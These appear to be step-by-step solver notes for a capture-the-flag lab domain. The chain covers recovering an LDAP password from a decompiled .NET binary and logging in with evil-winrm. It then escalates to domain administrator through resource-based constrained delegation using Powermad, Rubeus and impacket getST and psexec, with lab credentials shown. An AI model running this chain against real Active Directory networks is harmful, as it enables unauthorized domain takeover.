## Solver
```
smbshare
timeout 3600
get UserInfo.exe.zip
reverse UserInfo.exe using dnspy because .NET
got enc function password encrypted with key
got password with reverse enc function
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
got users support with info like a password
support:Ironside47pleasure40Watchful
evil-winrm to remote access
got user.txt
upload powermad.ps1, rubeus.exe, powerview.ps1, Import-ActiveDirectory.ps1
import-module ./Powermad.ps1
create a new machine account
New-MachineAccount -MachineAccount Banua -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force) -Verbose
using Import-ActiveDirectory.ps1
Set-ADComputer dc -PrincipalsAllowedToDelegateToAccount Banua$
Get-ADComputer dc -Properties PrincipalsAllowedToDelegateToAccount
get hash password of Banua using Rubeus.exe
save aes256 for Rubeus ticket
aes256:0AB86990DC0B93A52BD5949EC2E669DBA5EC5491EA885AB185D8CE5341B41BA2
impacket.getST support.htb/Banua -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 0AB86990DC0B93A52BD5949EC2E669DBA5EC5491EA885AB185D8CE5341B41BA2
export KRB5CCNAME=administrator.ccache
gaining RCE with impacket.psexec
impacket.psexec support.htb/administrator@dc.support.htb -no-pass -k
got root.txt
```
